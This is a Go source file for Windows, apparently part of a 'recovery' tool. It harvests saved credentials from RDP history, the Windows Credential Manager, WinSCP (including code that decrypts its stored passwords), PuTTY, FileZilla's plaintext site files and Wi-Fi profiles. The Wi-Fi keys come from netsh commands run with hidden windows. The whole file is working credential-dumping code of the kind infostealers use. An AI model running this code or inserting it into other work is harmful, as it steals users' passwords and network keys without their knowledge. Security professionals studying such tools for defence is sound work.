//go:build windows

package scanner

import (
	"encoding/xml"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"

	"recovery/recovery/types"
)

var (
	advapi32           = syscall.NewLazyDLL("advapi32.dll")
	procCredEnumerateW = advapi32.NewProc("CredEnumerateW")
	procCredFree       = advapi32.NewProc("CredFree")
)

const (
	credTypeGeneric          = 1
	credTypeDomainPassword   = 2
	credTypeDomainCertificate = 3
)

type winCredential struct {
	Flags              uint32
	Type               uint32
	TargetName         *uint16
	Comment            *uint16
	LastWritten        syscall.Filetime
	CredentialBlobSize uint32
	CredentialBlob     *byte
	Persist            uint32
	AttributeCount     uint32
	Attributes         uintptr
	TargetAlias        *uint16
	UserName           *uint16
}

func ScanApps() []types.AppCredentialResult {
	var results []types.AppCredentialResult
	results = append(results, scanRDP()...)
	results = append(results, scanWinSCP()...)
	results = append(results, scanPuTTY()...)
	results = append(results, scanFileZilla()...)
	results = append(results, scanCredentialManager()...)
	results = append(results, scanWiFi()...)
	return results
}

// ── RDP ────────────────────────────────────────────────────────────────

func scanRDP() []types.AppCredentialResult {
	var results []types.AppCredentialResult

	// Registry: saved connection history with usernames
	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Terminal Server Client\Servers`, registry.ENUMERATE_SUB_KEYS|registry.READ)
	if err == nil {
		defer k.Close()
		servers, _ := k.ReadSubKeyNames(-1)
		for _, server := range servers {
			sk, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Terminal Server Client\Servers\`+server, registry.READ)
			if err != nil {
				continue
			}
			username, _, _ := sk.GetStringValue("UsernameHint")
			sk.Close()

			r := types.AppCredentialResult{
				Application: "RDP",
				Host:        server,
				Port:        3389,
				Username:    username,
				Protocol:    "rdp",
			}

			// Try to get the password from Credential Manager
			pw := credManagerLookup("TERMSRV/" + server)
			if pw != "" {
				r.Password = pw
			}
			results = append(results, r)
		}
	}

	// Also scan Credential Manager for TERMSRV/* entries not in the registry
	creds := enumCredentials()
	seen := make(map[string]bool)
	for _, r := range results {
		seen[strings.ToLower(r.Host)] = true
	}
	for _, c := range creds {
		target := strings.ToLower(c.target)
		if !strings.HasPrefix(target, "termsrv/") {
			continue
		}
		host := c.target[len("TERMSRV/"):]
		if seen[strings.ToLower(host)] {
			continue
		}
		results = append(results, types.AppCredentialResult{
			Application: "RDP",
			Host:        host,
			Port:        3389,
			Username:    c.username,
			Password:    c.password,
			Protocol:    "rdp",
		})
	}

	// Scan for .rdp files
	results = append(results, scanRDPFiles()...)

	return results
}

func scanRDPFiles() []types.AppCredentialResult {
	var results []types.AppCredentialResult
	home, _ := os.UserHomeDir()
	if home == "" {
		return nil
	}

	dirs := []string{
		filepath.Join(home, "Desktop"),
		filepath.Join(home, "Documents"),
		filepath.Join(home, "Downloads"),
	}

	for _, dir := range dirs {
		entries, err := os.ReadDir(dir)
		if err != nil {
			continue
		}
		for _, e := range entries {
			if e.IsDir() || !strings.HasSuffix(strings.ToLower(e.Name()), ".rdp") {
				continue
			}
			path := filepath.Join(dir, e.Name())
			data, err := os.ReadFile(path)
			if err != nil || len(data) == 0 {
				continue
			}
			r := parseRDPFile(string(data))
			if r.Host != "" {
				r.Extra = path
				results = append(results, r)
			}
		}
	}

	return results
}

func parseRDPFile(content string) types.AppCredentialResult {
	r := types.AppCredentialResult{
		Application: "RDP",
		Protocol:    "rdp",
		Port:        3389,
	}
	for _, line := range strings.Split(content, "\n") {
		line = strings.TrimSpace(line)
		parts := strings.SplitN(line, ":", 3)
		if len(parts) < 3 {
			continue
		}
		key := strings.ToLower(strings.TrimSpace(parts[0]))
		val := strings.TrimSpace(parts[2])
		switch key {
		case "full address":
			if idx := strings.LastIndex(val, ":"); idx > 0 {
				if p, err := strconv.Atoi(val[idx+1:]); err == nil {
					r.Host = val[:idx]
					r.Port = p
					continue
				}
			}
			r.Host = val
		case "username":
			r.Username = val
		case "server port":
			if p, err := strconv.Atoi(val); err == nil {
				r.Port = p
			}
		}
	}
	return r
}

// ── WinSCP ─────────────────────────────────────────────────────────────

func scanWinSCP() []types.AppCredentialResult {
	var results []types.AppCredentialResult

	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Martin Prikryl\WinSCP 2\Sessions`, registry.ENUMERATE_SUB_KEYS|registry.READ)
	if err != nil {
		return nil
	}
	defer k.Close()

	sessions, _ := k.ReadSubKeyNames(-1)
	for _, sess := range sessions {
		if sess == "Default%20Settings" {
			continue
		}
		sk, err := registry.OpenKey(registry.CURRENT_USER, `Software\Martin Prikryl\WinSCP 2\Sessions\`+sess, registry.READ)
		if err != nil {
			continue
		}

		hostname, _, _ := sk.GetStringValue("HostName")
		username, _, _ := sk.GetStringValue("UserName")
		portNum, _, _ := sk.GetIntegerValue("PortNumber")
		encPassword, _, _ := sk.GetStringValue("Password")
		fsProtocol, _, _ := sk.GetIntegerValue("FSProtocol")
		sk.Close()

		if hostname == "" {
			continue
		}

		port := int(portNum)
		if port == 0 {
			port = 22
		}

		protocol := "sftp"
		switch fsProtocol {
		case 0:
			protocol = "sftp"
		case 5:
			protocol = "ftp"
		case 1:
			protocol = "scp"
		}

		password := ""
		if encPassword != "" {
			password = decryptWinSCPPassword(encPassword, hostname, username)
		}

		results = append(results, types.AppCredentialResult{
			Application: "WinSCP",
			Host:        hostname,
			Port:        port,
			Username:    username,
			Password:    password,
			Protocol:    protocol,
		})
	}

	return results
}

func decryptWinSCPPassword(hex, hostname, username string) string {
	key := username + hostname

	decNextChar := func(s string, idx int) (byte, int) {
		if idx+2 > len(s) {
			return 0, idx + 2
		}
		a, err1 := strconv.ParseUint(string(s[idx]), 16, 8)
		b, err2 := strconv.ParseUint(string(s[idx+1]), 16, 8)
		if err1 != nil || err2 != nil {
			return 0, idx + 2
		}
		return byte(0xFF ^ ((a<<4 | b) ^ 0xA3)), idx + 2
	}

	idx := 0
	flag, idx := decNextChar(hex, idx)

	if flag == 0xFF {
		return ""
	}

	_, idx = decNextChar(hex, idx) // skip unused byte

	length, idx := decNextChar(hex, idx)

	delLen, idx := decNextChar(hex, idx)
	for i := 0; i < int(delLen); i++ {
		_, idx = decNextChar(hex, idx)
	}

	raw := make([]byte, 0, int(length))
	for i := 0; i < int(length); i++ {
		c, newIdx := decNextChar(hex, idx)
		idx = newIdx
		raw = append(raw, c)
	}

	if len(key) > 0 {
		decrypted := make([]byte, len(raw))
		for i, c := range raw {
			decrypted[i] = c ^ key[i%len(key)]
		}
		return string(decrypted)
	}

	return string(raw)
}

// ── PuTTY ──────────────────────────────────────────────────────────────

func scanPuTTY() []types.AppCredentialResult {
	var results []types.AppCredentialResult

	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\SimonTatham\PuTTY\Sessions`, registry.ENUMERATE_SUB_KEYS|registry.READ)
	if err != nil {
		return nil
	}
	defer k.Close()

	sessions, _ := k.ReadSubKeyNames(-1)
	for _, sess := range sessions {
		if sess == "Default%20Settings" {
			continue
		}
		sk, err := registry.OpenKey(registry.CURRENT_USER, `Software\SimonTatham\PuTTY\Sessions\`+sess, registry.READ)
		if err != nil {
			continue
		}

		hostname, _, _ := sk.GetStringValue("HostName")
		username, _, _ := sk.GetStringValue("UserName")
		portNum, _, _ := sk.GetIntegerValue("PortNumber")
		protocol, _, _ := sk.GetStringValue("Protocol")
		keyFile, _, _ := sk.GetStringValue("PublicKeyFile")
		proxyHost, _, _ := sk.GetStringValue("ProxyHost")
		sk.Close()

		if hostname == "" {
			continue
		}

		port := int(portNum)
		if port == 0 {
			port = 22
		}
		if protocol == "" {
			protocol = "ssh"
		}

		extra := ""
		if keyFile != "" || proxyHost != "" {
			parts := []string{}
			if keyFile != "" {
				parts = append(parts, "key:"+keyFile)
			}
			if proxyHost != "" {
				parts = append(parts, "proxy:"+proxyHost)
			}
			extra = strings.Join(parts, "; ")
		}

		// URL-decode session name for display purposes
		decodedName := strings.ReplaceAll(sess, "%20", " ")
		_ = decodedName

		results = append(results, types.AppCredentialResult{
			Application: "PuTTY",
			Host:        hostname,
			Port:        port,
			Username:    username,
			Protocol:    protocol,
			Extra:       extra,
		})
	}

	return results
}

// ── FileZilla ──────────────────────────────────────────────────────────

type fzServer struct {
	XMLName  xml.Name `xml:"Server"`
	Host     string   `xml:"Host"`
	Port     int      `xml:"Port"`
	Protocol int      `xml:"Protocol"`
	User     string   `xml:"User"`
	Pass     string   `xml:"Pass"`
}

type fzSiteManager struct {
	XMLName xml.Name   `xml:"FileZilla3"`
	Servers []fzServer `xml:"Servers>Server"`
}

type fzRecentServers struct {
	XMLName xml.Name   `xml:"FileZilla3"`
	Servers []fzServer `xml:"RecentServers>Server"`
}

func scanFileZilla() []types.AppCredentialResult {
	var results []types.AppCredentialResult

	appdata := os.Getenv("APPDATA")
	if appdata == "" {
		return nil
	}
	fzDir := filepath.Join(appdata, "FileZilla")

	for _, file := range []string{"sitemanager.xml", "recentservers.xml"} {
		path := filepath.Join(fzDir, file)
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}

		var servers []fzServer
		if file == "sitemanager.xml" {
			var sm fzSiteManager
			if xml.Unmarshal(data, &sm) == nil {
				servers = sm.Servers
			}
		} else {
			var rs fzRecentServers
			if xml.Unmarshal(data, &rs) == nil {
				servers = rs.Servers
			}
		}

		for _, s := range servers {
			if s.Host == "" {
				continue
			}
			port := s.Port
			if port == 0 {
				port = 21
			}
			protocol := "ftp"
			switch s.Protocol {
			case 1:
				protocol = "sftp"
			case 3, 4:
				protocol = "ftps"
			}

			results = append(results, types.AppCredentialResult{
				Application: "FileZilla",
				Host:        s.Host,
				Port:        port,
				Username:    s.User,
				Password:    s.Pass,
				Protocol:    protocol,
			})
		}
	}

	return results
}

// ── Windows Credential Manager ─────────────────────────────────────────

type credEntry struct {
	target   string
	username string
	password string
	credType uint32
}

func enumCredentials() []credEntry {
	var count uint32
	var credsPtr uintptr

	ret, _, _ := procCredEnumerateW.Call(
		0,
		0,
		uintptr(unsafe.Pointer(&count)),
		uintptr(unsafe.Pointer(&credsPtr)),
	)
	if ret == 0 || count == 0 {
		return nil
	}
	defer procCredFree.Call(credsPtr)

	var results []credEntry
	for i := uint32(0); i < count; i++ {
		entryPtr := *(*uintptr)(unsafe.Pointer(credsPtr + uintptr(i)*unsafe.Sizeof(uintptr(0))))
		c := (*winCredential)(unsafe.Pointer(entryPtr))
		target := windows.UTF16PtrToString(c.TargetName)
		username := ""
		if c.UserName != nil {
			username = windows.UTF16PtrToString(c.UserName)
		}
		password := ""
		if c.CredentialBlobSize > 0 && c.CredentialBlob != nil {
			blob := unsafe.Slice(c.CredentialBlob, c.CredentialBlobSize)
			password = string(blob)
		}
		results = append(results, credEntry{
			target:   target,
			username: username,
			password: password,
			credType: c.Type,
		})
	}
	return results
}

func credManagerLookup(target string) string {
	target = strings.ToLower(target)
	for _, c := range enumCredentials() {
		if strings.ToLower(c.target) == target {
			return c.password
		}
	}
	return ""
}

func scanCredentialManager() []types.AppCredentialResult {
	var results []types.AppCredentialResult

	for _, c := range enumCredentials() {
		target := strings.ToLower(c.target)
		// Skip TERMSRV entries (already handled by RDP scanner)
		if strings.HasPrefix(target, "termsrv/") {
			continue
		}
		// Skip entries with no useful data
		if c.username == "" && c.password == "" {
			continue
		}

		typeName := "generic"
		switch c.credType {
		case credTypeDomainPassword:
			typeName = "domain"
		case credTypeDomainCertificate:
			typeName = "certificate"
		}

		results = append(results, types.AppCredentialResult{
			Application: "CredManager",
			Host:        c.target,
			Username:    c.username,
			Password:    c.password,
			Protocol:    typeName,
		})
	}

	return results
}

// ── WiFi ───────────────────────────────────────────────────────────────

func scanWiFi() []types.AppCredentialResult {
	var results []types.AppCredentialResult

	cmd := exec.Command("netsh", "wlan", "show", "profiles")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: windows.CREATE_NO_WINDOW}
	out, err := cmd.Output()
	if err != nil {
		return nil
	}

	var profiles []string
	for _, line := range strings.Split(string(out), "\n") {
		line = strings.TrimSpace(line)
		if idx := strings.Index(line, ": "); idx >= 0 {
			lower := strings.ToLower(line[:idx])
			if strings.Contains(lower, "all user profile") || strings.Contains(lower, "profil") {
				name := strings.TrimSpace(line[idx+2:])
				if name != "" {
					profiles = append(profiles, name)
				}
			}
		}
	}

	for _, name := range profiles {
		cmd := exec.Command("netsh", "wlan", "show", "profile", fmt.Sprintf("name=%s", name), "key=clear")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: windows.CREATE_NO_WINDOW}
		out, err := cmd.Output()
		if err != nil {
			continue
		}

		password := ""
		auth := ""
		for _, line := range strings.Split(string(out), "\n") {
			line = strings.TrimSpace(line)
			if idx := strings.Index(line, ": "); idx >= 0 {
				lower := strings.ToLower(line[:idx])
				val := strings.TrimSpace(line[idx+2:])
				if strings.Contains(lower, "key content") || strings.Contains(lower, "contenu") {
					password = val
				} else if strings.Contains(lower, "authentication") || strings.Contains(lower, "authentification") {
					auth = val
				}
			}
		}

		results = append(results, types.AppCredentialResult{
			Application: "WiFi",
			Host:        name,
			Username:    auth,
			Password:    password,
			Protocol:    "wifi",
		})
	}

	return results
}
